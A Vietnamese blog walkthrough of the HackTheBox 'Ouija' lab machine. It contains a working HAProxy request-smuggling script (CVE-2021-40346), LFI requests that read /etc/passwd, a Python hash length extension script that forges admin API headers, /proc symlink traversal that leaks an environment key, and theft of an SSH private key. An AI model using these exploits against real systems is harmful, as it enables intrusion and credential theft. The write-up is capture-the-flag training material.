<div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh9k6Vt5OJofaxvAwoyW5bPLMyM8nm6V0TQkS0hEMYDgsbtEcSaqDp-T9pl6v4qM7Tgw_pLyhPWquE44uHDEHNE-1nj1vyxvOqf5eMMePYFzzKk5YDuRJ1U6hP2bu8LG2lSMyfac45pXyT5LclecwfYz6eP0pAzP94ff1mBEoXVGcCEN3dBF55BbD80LsUN/s299/HackTheBox-Ouija.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="129" data-original-width="299" height="129" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh9k6Vt5OJofaxvAwoyW5bPLMyM8nm6V0TQkS0hEMYDgsbtEcSaqDp-T9pl6v4qM7Tgw_pLyhPWquE44uHDEHNE-1nj1vyxvOqf5eMMePYFzzKk5YDuRJ1U6hP2bu8LG2lSMyfac45pXyT5LclecwfYz6eP0pAzP94ff1mBEoXVGcCEN3dBF55BbD80LsUN/s1600/HackTheBox-Ouija.png" width="299" /></a></div><h2>Enumeration</h2><h3>Zenmap:</h3><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgowi06As3PvX0ohvZKLwYn09ssIBqlBMsscMCyByhevFhVzUVaSSle_LLu90yU__HXghWbw9k94EwMsjyal-FqZ4VOkb3vG0eteLbaFnb7IFsCmkqjjleIzIm9TsvkmGRJnb3UG9b5fNFQx9C5H_VpRlR1ntWyDwkalvKyWtL-nSqk2fOxOq2BHRYO5Ypg/s891/HackTheBox-Ouija-nmap.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="549" data-original-width="891" height="394" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgowi06As3PvX0ohvZKLwYn09ssIBqlBMsscMCyByhevFhVzUVaSSle_LLu90yU__HXghWbw9k94EwMsjyal-FqZ4VOkb3vG0eteLbaFnb7IFsCmkqjjleIzIm9TsvkmGRJnb3UG9b5fNFQx9C5H_VpRlR1ntWyDwkalvKyWtL-nSqk2fOxOq2BHRYO5Ypg/w640-h394/HackTheBox-Ouija-nmap.png" width="640" /></a></div><div style="text-align: left;">Kiểm tra website:</div><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhaPI8Mqog0BQ3lcFKJTbnjII80rjwxIllIfLrVv51vK33AGbs8zXzpaAYJHotLeEtg59s-t7bgfFlP-lbVJ_IklRDTVj_sZv-jduJNaagvgewDrlqLB7sEfiFfuUDjYVwq-DM-wRhEhGBlgaHYa0M_0G3gATdZyEqA2n2vBSozbu2ycSyT8AhslvavXsRp/s899/HackTheBox-Ouija-website.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="550" data-original-width="899" height="392" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhaPI8Mqog0BQ3lcFKJTbnjII80rjwxIllIfLrVv51vK33AGbs8zXzpaAYJHotLeEtg59s-t7bgfFlP-lbVJ_IklRDTVj_sZv-jduJNaagvgewDrlqLB7sEfiFfuUDjYVwq-DM-wRhEhGBlgaHYa0M_0G3gATdZyEqA2n2vBSozbu2ycSyT8AhslvavXsRp/w640-h392/HackTheBox-Ouija-website.png" width="640" /></a></div><br /><div style="text-align: left;">Từ mã nguồn website tôi tìm thấy:</div><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhCMhKAdwoCjuxd95y5tjjFnArVSx1GREEgPFilTJ4Ni1m__W0RzmJwJxTlkJrRe3RxB8G_9df4p3oHEWKe3vuv0Q0RNfhFG_IKcyKSZm-Gqc-KMw5uvqVr9KqMh56T8aa274i19WbH-idJ8BPgaS79FVRexDv0xplCBH3x7JOq96Re8F4hHCKnlpeQcHRp/s705/HackTheBox-Ouija-website-source.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="85" data-original-width="705" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhCMhKAdwoCjuxd95y5tjjFnArVSx1GREEgPFilTJ4Ni1m__W0RzmJwJxTlkJrRe3RxB8G_9df4p3oHEWKe3vuv0Q0RNfhFG_IKcyKSZm-Gqc-KMw5uvqVr9KqMh56T8aa274i19WbH-idJ8BPgaS79FVRexDv0xplCBH3x7JOq96Re8F4hHCKnlpeQcHRp/s16000/HackTheBox-Ouija-website-source.png" /></a></div><h3 style="text-align: left;">Gitea:</h3><div style="text-align: left;">Kiểm tra gitea tôi thấy repo&nbsp;ouija-htb của user leila. Nhận thấy mã nguồn này không có nhiều giá trị khai thác. Nhưng:</div><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEinMJDh2aSkVQmaapHtbvfoXI6PT0yp1iL7wx7fOnP9aRkY0a6rAu_2g3w1H1CePGKKebyhruGtB6I7y_fne8_Njft1EWidjK2smnU5LRGw_Op6tg6_V3szduFG8mUFjqvoPrBIiJYI4By1ugbpvcrldfrh-hgQecOg0vKU5jhtE0DbeKYGqcqVcP-Ia9-X/s899/HackTheBox-Ouija-gitea.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="607" data-original-width="899" height="432" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEinMJDh2aSkVQmaapHtbvfoXI6PT0yp1iL7wx7fOnP9aRkY0a6rAu_2g3w1H1CePGKKebyhruGtB6I7y_fne8_Njft1EWidjK2smnU5LRGw_Op6tg6_V3szduFG8mUFjqvoPrBIiJYI4By1ugbpvcrldfrh-hgQecOg0vKU5jhtE0DbeKYGqcqVcP-Ia9-X/w640-h432/HackTheBox-Ouija-gitea.png" width="640" /></a></div>Tôi thấy thông tin về hệ thống, có HA-Proxy version 2.2.16. Phiên bản này có lỗ hổng: <a class="button info" href="https://jfrog.com/blog/critical-vulnerability-in-haproxy-cve-2021-40346-integer-overflow-enables-http-smuggling/" target="_blank">Critical Vulnerability in HAProxy</a> <a class="button info" href="https://github.com/donky16/CVE-2021-40346-POC" target="_blank">CVE-2021-40346-POC</a><div style="text-align: left;">Lỗ hổng này sẽ cho phép tôi&nbsp;http smuggling. Tìm kiếm các path bị chặn</div><h3 style="text-align: left;">ffuf:</h3><div>Liệt kê các path có thể sử dụng:</div><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgl4cel8PKgx0GgMbg5Qvli8tzuzRKQNNeKs3cTf3RZbtXyhPJMg3nLgJNnZxLFz2OTwHeFchyphenhyphenqZKOQf8tYC8aPtk8ihG_IexeY9n_pQuEYcrecmYq0KC4iKaeSyC0b5E6qQn3bJLA6X_1_PxX6rxJ9-1W4EuKigvfHKLG2SY1CONFRjNivP4aJ5dh3Ojz4/s939/HackTheBox-Ouija-ffuf-path.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="677" data-original-width="939" height="462" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgl4cel8PKgx0GgMbg5Qvli8tzuzRKQNNeKs3cTf3RZbtXyhPJMg3nLgJNnZxLFz2OTwHeFchyphenhyphenqZKOQf8tYC8aPtk8ihG_IexeY9n_pQuEYcrecmYq0KC4iKaeSyC0b5E6qQn3bJLA6X_1_PxX6rxJ9-1W4EuKigvfHKLG2SY1CONFRjNivP4aJ5dh3Ojz4/w640-h462/HackTheBox-Ouija-ffuf-path.png" width="640" /></a></div>Tôi thấy rằng path admin là path duy nhất tôi thấy ở đây không có trong gitea và nó bị block bởi haproxy.<br /><div>Liệt kê domain:</div><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj5N0LFedzQNY8e-YX2HzWGbr5zFVglPSgONqVkAjYDa_NzfEZ7jCVfZ9QHg4QWsPcHsR5-0rCA_jGVDzJvl9jQ75wXyNraVKq070DWIMttEFVlVDUNB73R8yV55hUwXdsTRyIaRd2-tuB4Om8_HMGolMaiw-1iIpR3DILHa_C4yOjdipHZkG-ZBWfEcoAx/s1121/HackTheBox-Ouija-ffuf-domain.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="822" data-original-width="1121" height="470" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj5N0LFedzQNY8e-YX2HzWGbr5zFVglPSgONqVkAjYDa_NzfEZ7jCVfZ9QHg4QWsPcHsR5-0rCA_jGVDzJvl9jQ75wXyNraVKq070DWIMttEFVlVDUNB73R8yV55hUwXdsTRyIaRd2-tuB4Om8_HMGolMaiw-1iIpR3DILHa_C4yOjdipHZkG-ZBWfEcoAx/w640-h470/HackTheBox-Ouija-ffuf-domain.png" width="640" /></a></div>Tại đây tôi cũng thấy rất nhiều domain bị block.<div><h2>Gaining access leila</h2><div><div>Với lỗ hổng mà tôi tìm thấy trước đó với HA-Proxy: tôi có khai thác như sau:</div><div><span style="color: #ff00fe;">*note:</span>&nbsp;disable update Content-Length (repeater &gt; Update Content-Length) and&nbsp;calculate the exact Content-Length to send pakage.</div><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjCX0tlaAWt7QC_ZYtc134HRQlN_RnnEy-_kG5-xu5U9Q3xRddyQG322tMXzFTVtZYaAKge2TswwGy3YGwoy8wsZDJPu0dYJ7QpUodiIboHdo8jsQ5vcdBbT0IVms7QeqF4ihW8XyHAEfstlQJ_ntu661goYT4rEONJVUSsQ2J2UYVEa7GobAGLfC_ex4YY/s972/HackTheBox-Ouija-exploit-ha-proxy.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="443" data-original-width="972" height="292" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjCX0tlaAWt7QC_ZYtc134HRQlN_RnnEy-_kG5-xu5U9Q3xRddyQG322tMXzFTVtZYaAKge2TswwGy3YGwoy8wsZDJPu0dYJ7QpUodiIboHdo8jsQ5vcdBbT0IVms7QeqF4ihW8XyHAEfstlQJ_ntu661goYT4rEONJVUSsQ2J2UYVEa7GobAGLfC_ex4YY/w640-h292/HackTheBox-Ouija-exploit-ha-proxy.png" width="640" /></a></div>Tôi thấy kết quả trả về thành công, tôi đã truy cập được website admin. Nhưng không tồn tại điều gì có thể khai thác được ở website này.</div><div>Thử cố gắng kết nối tới các sub-domain bị block. Tại sub-domain dev có kết nối thành công:</div><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhzVI9AUBPIOy788wSrh_EIQ_cWKogli5quZk0WS2Q1DxWxahkLpH9SK4dvRUl0V5jBWYYiw28MiO6qCAKsyd776uiNp6NWHm1ChFUEsp-IskaPWChavcTRzKeqO6Jrsm6OBHY8ibdndx63bCTgwhvZPgkBr4g73jOyOKlUBbSH7GC0QgjDCX3QWI89MGhV/s972/HackTheBox-Ouija-exploit-ha-proxy-domain-dev.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="432" data-original-width="972" height="284" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhzVI9AUBPIOy788wSrh_EIQ_cWKogli5quZk0WS2Q1DxWxahkLpH9SK4dvRUl0V5jBWYYiw28MiO6qCAKsyd776uiNp6NWHm1ChFUEsp-IskaPWChavcTRzKeqO6Jrsm6OBHY8ibdndx63bCTgwhvZPgkBr4g73jOyOKlUBbSH7GC0QgjDCX3QWI89MGhV/w640-h284/HackTheBox-Ouija-exploit-ha-proxy-domain-dev.png" width="640" /></a></div>Tại website có xuất hiện path&nbsp;editor.php với đầu vào là file. Với đầu vào này rất dễ dẫn đến lỗ hổng lfi.</div><div>Để thuận tiện cho việc khai thác tôi đã viết một tập lệnh khai thác như sau:</div><div><pre lang="bash">#!/bin/bash

path=$1
cl=$((16+`echo $path | wc -m`))
payload="POST / HTTP/1.1\r\nHost: ouija.htb\r\nContent-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:\r\nContent-Length: $cl\r\n\r\nGET $path HTTP/1.1\r\nh:GET / HTTP/1.1\r\nHost: ouija.htb\r\n\r\n"

echo -ne $payload | nc -w 1 ouija.htb 80 | sed -n '428,$p'</pre>Khi đó khai thác của tôi sẽ đơn giản hơn như sau:</div><div><pre lang="html">$ ./lfi.sh /admin/
&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;
&lt;html&gt;
 &lt;head&gt;
  &lt;title&gt;Index of /admin&lt;/title&gt;
 &lt;/head&gt;
 &lt;body&gt;
&lt;h1&gt;Index of /admin&lt;/h1&gt;
  &lt;table&gt;
   &lt;tr&gt;&lt;th valign="top"&gt;&lt;img src="/icons/blank.gif" alt="[ICO]"&gt;&lt;/th&gt;&lt;th&gt;&lt;a href="?C=N;O=D"&gt;Name&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href="?C=M;O=A"&gt;Last modified&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href="?C=S;O=A"&gt;Size&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href="?C=D;O=A"&gt;Description&lt;/a&gt;&lt;/th&gt;&lt;/tr&gt;
   &lt;tr&gt;&lt;th colspan="5"&gt;&lt;hr&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;img src="/icons/back.gif" alt="[PARENTDIR]"&gt;&lt;/td&gt;&lt;td&gt;&lt;a href="/"&gt;Parent Directory&lt;/a&gt;&lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;td align="right"&gt;  - &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
   &lt;tr&gt;&lt;th colspan="5"&gt;&lt;hr&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;/table&gt;
&lt;address&gt;Apache/2.4.52 (Ubuntu) Server at ouija.htb Port 80&lt;/address&gt;
&lt;/body&gt;&lt;/html&gt;
$ ./lfi.sh http://dev.ouija.htb/
&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;

&lt;head&gt;
    &lt;meta charset="UTF-8"&gt;
    &lt;title&gt;Ouija dev&lt;/title&gt;
    &lt;link rel="stylesheet" href="style.css"&gt;
&lt;/head&gt;

&lt;body&gt;

    &lt;h1&gt;projects under development&lt;/h1&gt;

    &lt;ul&gt;
        &lt;li&gt;
            &lt;strong&gt;Project Name:&lt;/strong&gt; Api
            &lt;br&gt;
            &lt;strong&gt;Api Source Code:&lt;/strong&gt; &lt;a href="http://dev.ouija.htb/editor.php?file=app.js" target="_blank"&gt;app.js&lt;/a&gt;
            &lt;strong&gt;Init File:&lt;/strong&gt; &lt;a href="http://dev.ouija.htb/editor.php?file=init.sh" target="_blank"&gt;init.sh&lt;/a&gt;
        &lt;/li&gt;

    &lt;/ul&gt;

    &lt;footer&gt;
        &amp;copy; 2023 ouija software
    &lt;/footer&gt;
&lt;/body&gt;

&lt;/html&gt;
$ ./lfi.sh http://dev.ouija.htb/editor.php?file=../../../../../../etc/passwd

&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;

&lt;head&gt;
    &lt;meta charset="UTF-8"&gt;
    &lt;title&gt;Text Editor&lt;/title&gt;
    &lt;link rel="stylesheet" href="style.css"&gt;
&lt;/head&gt;

&lt;body&gt;
    &lt;h1&gt;Text Editor&lt;/h1&gt;

    &lt;div class="container"&gt;
        &lt;h3&gt;../../../../../../etc/passwd&lt;/h3&gt;
        &lt;textarea name="content" id="content" cols="30" rows="10"&gt;root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
&lt;/textarea&gt;
        &lt;button type="submit"&gt;Save&lt;/button&gt;
    &lt;/div&gt;
&lt;/body&gt;
    &lt;footer&gt;
        &amp;copy; 2023 ouija software
    &lt;/footer&gt;
&lt;/html&gt;</pre>Tôi thấy rằng tôi có thể thực hiện lfi. Quay lại với 2 file code chính trong sub-domain dev.</div><div><span style="color: #ff00fe;">init.sh</span></div><div><pre lang="bash">#!/bin/bash

echo "$(date) api config starts" &gt;&gt;
mkdir -p .config/bin .config/local .config/share /var/log/zapi
export k=$(cat /opt/auth/api.key)
export botauth_id="bot1:bot"
export hash="4b22a0418847a51650623a458acc1bba5c01f6521ea6135872b9f15b56b988c1"
ln -s /proc .config/bin/process_informations
echo "$(date) api config done" &gt;&gt; /var/log/zapi/api.log

exit 1</pre></div><div>Tôi thấy chương trình load key từ&nbsp;/opt/auth/api.key và có hash và auth_id. Cố gắng đọc file api.key từ lfi nhưng nó không tồn tại nên tôi không thể đọc nội dung của nó.</div><div>Một liên kết mềm được tạo ra liên kết /proc với .config/bin/process_informations</div><div><span style="color: #ff00fe;">app.js</span><br /><div><pre lang="js">var express = require('express');
var app = express();
var crt = require('crypto');
var b85 = require('base85');
var fs = require('fs');
const key = process.env.k;

app.listen(3000, ()=&gt;{ console.log("listening @ 3000"); });

function d(b){
    s1=(Buffer.from(b, 'base64')).toString('utf-8');
    s2=(Buffer.from(s1.toLowerCase(), 'hex'));
    return s2;
}
function generate_cookies(identification){
    var sha256=crt.createHash('sha256');
    wrap = sha256.update(key);
    wrap = sha256.update(identification);
    hash=sha256.digest('hex');
    return(hash);
}
function verify_cookies(identification, rhash){
    if( ((generate_cookies(d(identification)))) === rhash){
        return 0;
    }else{return 1;}
}
function ensure_auth(q, r) {
    if(!q.headers['ihash']) {
        r.json("ihash header is missing");
    }
    else if (!q.headers['identification']) {
        r.json("identification header is missing");
    }

    if(verify_cookies(q.headers['identification'], q.headers['ihash']) != 0) {
        r.json("Invalid Token");
    }
    else if (!(d(q.headers['identification']).includes("::admin:True"))) {
        r.json("Insufficient Privileges");
    }
}

app.get("/login", (q,r,n) =&gt; {
    if(!q.query.uname || !q.query.upass){
        r.json({"message":"uname and upass are required"});
    }else{
        if(!q.query.uname || !q.query.upass){
            r.json({"message":"uname &amp;&amp; upass are required"});
        }else{
            r.json({"message":"disabled (under dev)"});
        }
    }
});
app.get("/register", (q,r,n) =&gt; {r.json({"message":"__disabled__"});});
app.get("/users", (q,r,n) =&gt; {
    ensure_auth(q, r);
    r.json({"message":"Database unavailable"});
});
app.get("/file/get",(q,r,n) =&gt; {
    ensure_auth(q, r);
    if(!q.query.file){
        r.json({"message":"?file= i required"});
    }else{
        let file = q.query.file;
        if(file.startsWith("/") || file.includes('..') || file.includes("../")){
            r.json({"message":"Action not allowed"});
        }else{
            fs.readFile(file, 'utf8', (e,d)=&gt;{
                if(e) {
                    r.json({"message":e});
                }else{
                    r.json({"message":d});
                }
            });
        }
    }
});
app.get("/file/upload", (q,r,n) =&gt;{r.json({"message":"Disabled for security reasons"});});
app.get("/*", (q,r,n) =&gt; {r.json("200 not found , redirect to .");});</pre>Tôi thấy đây là mã nguồn cho port 3000 và chỉ có duy nhất api /file/get có chức năng có thể hoạt động. Để có thể sử dụng api này tôi cần hearder&nbsp;identification và ihash để có thể truy cập. Trước đó trong file init.sh tôi đã có hash và identification&nbsp;của bot, thử kiểm tra nó:</div><div><pre lang="bash">$ curl -H 'ihash: 4b22a0418847a51650623a458acc1bba5c01f6521ea6135872b9f15b56b988c1' \
&gt; -H "identification: `echo -ne bot1:bot | xxd -plain | base64`" "http://ouija.htb:3000/users" \
&gt; "http://ouija.htb:3000/users"
"Insufficient Privileges"</pre>Tôi thấy rằng kết nối bị lỗi ở kiểm tra identification có tồn tại <span style="color: #ff00fe;">::admin:True</span> hay không.<div>Nhận thấy chương trình chỉ đơn giản là kiếm tra tồn tại. Nếu identification của tôi bao gồm cả&nbsp;<span style="color: #ff00fe;">::admin:True</span>&nbsp;và các ký tự khác thì tôi có thể vượt qua nó. Tôi biết có một cách khai thác có thể vượt qua vấn đề này là&nbsp;<span style="color: #ff00fe;">hash length extension</span>. <a class="button info" href="https://github.com/viensea1106/hash-length-extension" target="_blank">length extesion tool</a></div><div>Nhưng tôi chưa biết length cần thiết cho điều này là gì, tôi quyết định&nbsp;brute force độ dài này, vì đơn giản&nbsp;brute force vấn đơn giản hơn nhiều là&nbsp;brute force key. ha haha.</div><div>Tôi có mã khai thác như sau:</div><div><pre lang="python">import requests
import HashTools
from base64 import b64encode

# setup context
original_data = b"bot1:bot"
sig = '4b22a0418847a51650623a458acc1bba5c01f6521ea6135872b9f15b56b988c1'
target_url = "http://ouija.htb:3000/users"

# attack
append_data = b"::admin:True"
magic = HashTools.new("sha256")
for x in range(1, 48):
    data, new_sig = magic.extension(
        secret_length=x, original_data=original_data,
        append_data=append_data, signature=sig
    )
    new_data = b64encode(data.hex().encode()).decode()
    headers = {"ihash": new_sig, "identification": new_data}
    r = requests.get(target_url, headers=headers)
    if "Invalid Token" not in r.text:
        print(f"Headers: {headers}")
        print(f"Length: {str(x)}")
        break</pre></div><div>Sau đó chạy khai thác và tôi có kết quả như sau:</div><div><pre lang="bash">$ python3 bfleng.py
Headers: {'ihash': '14b**********************************************************c0b',
'identification': 'NjI2Z***************************************************************************************************************************************NQ=='}
Length: 23</pre></div><div>Khi đó tôi đã có được quyền truy cập vào port 3000 với quyền admin:</div><div>Khai thác api&nbsp;/file/get:</div><div><pre lang="bash">PS D:\thehackbox\Machines\Ouija&gt; curl.exe -H 'ihash: 14b**********************************************************c0b' \
-H "identification: NjI2Z***************************************************************************************************************************************NQ==" \
"http://ouija.htb:3000/file/get?file=init.sh"
{"message":"#!/bin/bash\n\necho \"$(date) api config starts\" &gt;&gt;\nmkdir -p .config/bin .config/local .config/share /var/log/zapi\nexport k=$(cat /opt/auth/api.key)\nexport botauth_id=\"bot1:bot\"\nexport hash=\"4b22a0418847a51650623a458acc1bba5c01f6521ea6135872b9f15b56b988c1\"\nln -s /proc .config/bin/process_informations\necho \"$(date) api config done\" &gt;&gt; /var/log/zapi/api.log\n\nexit 1\n"}</pre></div><div style="text-align: left;">Tôi đã có quyền truy cập và đọc được file. Trước đó tôi biết rằng có một liên kết mềm từ <span style="color: #ff00fe;">/proc</span> đến <span style="color: #ff00fe;">.config/bin/process_informations</span>&nbsp;khi đó tôi đọc file <span style="color: #ff00fe;">/proc/self/envion</span> như sau:</div></div></div><div style="text-align: left;"><pre lang="bash">PS D:\thehackbox\Machines\Ouija&gt; curl.exe -H 'ihash: 14b**********************************************************c0b' \
-H "identification: NjI2Z***************************************************************************************************************************************NQ==" \
"http://ouija.htb:3000/file/get?file=.config/bin/process_informations/self/environ"
{"message":"LANG=en_US.UTF-8\u0000PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0000HOME=/home/leila\u0000LOGNAME=leila\u0000USER=leila\u0000SHELL=/bin/bash\u0000INVOCATION_ID=bb6889d575a34a858f2fc60340f7630a\u0000JOURNAL_STREAM=8:22866\u0000SYSTEMD_EXEC_PID=823\u0000k=FK*******************BD\u0000"}</pre></div><div style="text-align: left;">Từ đây tôi có thông tin key. Tôi thấy path&nbsp;<span style="color: #ff00fe;">/home/leila</span>.</div><div style="text-align: left;">Tôi biết rằng&nbsp;<span style="color: #ff00fe;">/proc/[PID]/root</span> được liên kết đến <span style="color: #ff00fe;">/</span>.</div><div style="text-align: left;">Khi đó tôi có thể truy cập root như sau:</div><div style="text-align: left;"><pre lang="bash">PS D:\thehackbox\Machines\Ouija&gt; curl.exe -H 'ihash: 14b**********************************************************c0b' \
-H "identification: NjI2Z***************************************************************************************************************************************NQ==" \
"http://ouija.htb:3000/file/get?file=.config/bin/process_informations/self/root/etc/passwd"
{"message":"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\nsystemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:104::/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\npollinate:x:105:1::/var/cache/pollinate:/bin/false\nsshd:x:106:65534::/run/sshd:/usr/sbin/nologin\nsyslog:x:107:113::/home/syslog:/usr/sbin/nologin\nuuidd:x:108:114::/run/uuidd:/usr/sbin/nologin\ntcpdump:x:109:115::/nonexistent:/usr/sbin/nologin\ntss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false\nlandscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin\nusbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\nlxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false\ndnsmasq:x:113:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin\nleila:x:1000:1000:helper:/home/leila:/bin/bash\nfwupd-refresh:x:114:121:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin\n_laurel:x:998:998::/var/log/laurel:/bin/false\n"}
PS D:\thehackbox\Machines\Ouija&gt;</pre></div><div style="text-align: left;">Truy cập thành công: Thử kiểm tra file id_rsa trong folder&nbsp;<span style="color: #ff00fe;">/home/leila/.ssh</span>.</div><div style="text-align: left;"><pre lang="bash">PS D:\thehackbox\Machines\Ouija&gt; curl.exe -H 'ihash: 14b**********************************************************c0b' \
-H "identification: NjI2Z***************************************************************************************************************************************NQ==" \
"http://ouija.htb:3000/file/get?file=.config/bin/process_informations/self/root/home/leila/.ssh/id_rsa"
{"message":"-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn\n...................................................\nDvfM2TbsfLo4kAAAALbGVpbGFAb3VpamE=\n-----END OPENSSH PRIVATE KEY-----\n"}</pre></div><div style="text-align: left;">Khi đó tôi thu được file id_rsa. Lấy về và truy cập với người dùng leila:</div><div style="text-align: left;"><pre lang="bash">PS D:\thehackbox\Machines\Ouija&gt; ssh -i .\id_rsa leila@ouija.htb
leila@ouija:~$ id
uid=1000(leila) gid=1000(leila) groups=1000(leila)
leila@ouija:~$ whoami
leila
leila@ouija:~$ ls
user.txt
